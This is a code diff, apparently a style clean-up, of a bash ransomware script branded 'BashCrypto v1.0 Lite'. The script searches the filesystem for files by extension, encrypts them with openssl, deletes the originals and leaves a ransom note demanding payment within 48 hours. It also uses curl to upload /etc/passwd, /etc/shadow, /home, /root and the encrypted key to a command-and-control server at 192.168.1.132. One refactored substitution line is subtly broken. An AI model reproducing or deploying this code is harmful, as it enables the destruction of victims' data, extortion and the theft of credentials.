@@ -3,7 +3,7 @@
 genFileName() {
   # Generate random value for the filename string size between 5 and 10
   # Build a filename string with the length of this random size out of the character set 'a-z'
-  randString=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 5-10 -n 1) | head -n 1)
+  randString=$(< /dev/urandom tr -dc '[:lower:]' | fold -w "$(shuf -i 5-10 -n 1)" | head -n 1)
 
   randStringSize=${#randString}
 
@@ -15,7 +15,7 @@ genFileName() {
   randNum=$((1 + (RANDOM % randHalfString)))
 
   # Do step 8 as many times as the random value in step 7 says
-  for ((i=0; i<${randNum}; i++))
+  for ((i=0; i<randNum; i++))
   do
     # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
     getRandNum=$((RANDOM % 9))
@@ -26,7 +26,7 @@ genFileName() {
       let getRandPos=$((getRandPos + 1))
     fi
 
-    getNewString=$(echo "${randString}" | sed "s/^\(.\{$getRandPos\}\)/\1$getRandNum/")
+    getNewString="${randString//^\(.\{$getRandPos\}\)/\1$getRandNum/}"
 
     randString="${getNewString}"
     randStringSize="${#randString}"
@@ -38,7 +38,7 @@ genFileName() {
 genExtName() {
   # Generate random value for the filename string size between 2 and 5
   # Build a filename string with the length of this random size out of the character set 'a-z'
-  randString=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 2-5 -n 1) | head -n 1)
+  randString=$(< /dev/urandom tr -dc '[:lower:]' | fold -w "$(shuf -i 2-5 -n 1)" | head -n 1)
 
   randStringSize=${#randString}
 
@@ -50,7 +50,7 @@ genExtName() {
   randNum=$((1 + (RANDOM % randHalfString)))
 
   # Do step 8 as many times as the random value in step 7 says
-  for ((i=0; i<${randNum}; i++))
+  for ((i=0; i<randNum; i++))
   do
     # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
     getRandNum=$((RANDOM % 9))
@@ -61,7 +61,7 @@ genExtName() {
       let getRandPos=$((getRandPos + 1))
     fi
 
-    getNewString=$(echo "${randString}" | sed "s/^\(.\{$getRandPos\}\)/\1$getRandNum/")
+    getNewString="${randString//^\(.\{$getRandPos\}\)/\1$getRandNum/}"
 
     randString="${getNewString}"
     randStringSize="${#randString}"
@@ -70,7 +70,7 @@ genExtName() {
   echo "${randString}"
 }
 
-genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
+genKey=$(< /dev/urandom tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
 curl -k -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null
 
@@ -135,16 +135,18 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
 curl -k https://192.168.1.132/downloads/pub.pem > /root/pub.pem 
 chmod 755 /root/pub.pem
 
-cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
+< /dev/urandom tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
 chmod 755 /root/key.bin
 
 for ((num=0; num<"${#fileExts[@]}"; num++))
 do
-  for file in $(find / -name "${fileExts[${num}]}")
+  fileName=$(find / -name "${fileExts[${num}]}" -exec ls {} \;)
+
+  for file in ${fileName}
   do
     setFileName=$(genFileName)
     setExtName=$(genExtName)
-    getDirName="$(dirname ${file})"
+    getDirName=$(dirname "${file}")
 
     filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')
 
@@ -152,19 +154,17 @@ do
    
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
-    rm -rf  ${file} &>/dev/null
+    rm -rf  "${file}" &>/dev/null
 
     count=$((count + 1))
   done
 done
 
-for ((num=0; num<"${#fileList[@]}"; num++))
-do
-  for file in "${fileList[${num}]}"
+for file in "${fileList[@]}"
   do
     setFileName=$(genFileName)
     setExtName=$(genExtName)
-    getDirName="$(dirname ${file})"
+    getDirName=$(dirname "${file}")
 
     filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')
 
@@ -172,10 +172,9 @@ do
 
     openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
-    rm -rf ${file} &>/dev/null
+    rm -rf "${file}" &>/dev/null
 
     count=$((count + 1))
-  done
 done
 
 openssl enc -aes-256-cbc -salt -in "/root/..file_mapping.db" -out "/root/..file_mapping.db.owned" -pass file:/root/key.bin &>/dev/null
@@ -183,7 +182,7 @@ rm -rf /root/..file_mapping.db
 
 curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.php
 
-for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
+for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
     echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
@@ -219,9 +218,9 @@ openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root
 rm -rf /root/key.bin
 
 # Exfil files to our C2
-tar czf - /root/..file_mapping.db.owned |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=file_mapping.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
-tar czf - /root/key.bin.enc | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=enc_key.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
-tar czf - /etc/passwd | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=passwd.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
-tar czf - /etc/shadow | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=shadow.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
-tar czf - /home/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=home.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
-tar czf - /root/ | curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=root.tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+exfilArr=("/root/..file_mapping.db.owned" "/root/key.bin.enc" "/etc/passwd" "/etc/shadow" "/home/" "/root/")
+
+for file in "${exfilArr[@]}"
+do
+  tar czf - "${file}" |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=$(basename "${file}").tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
+done
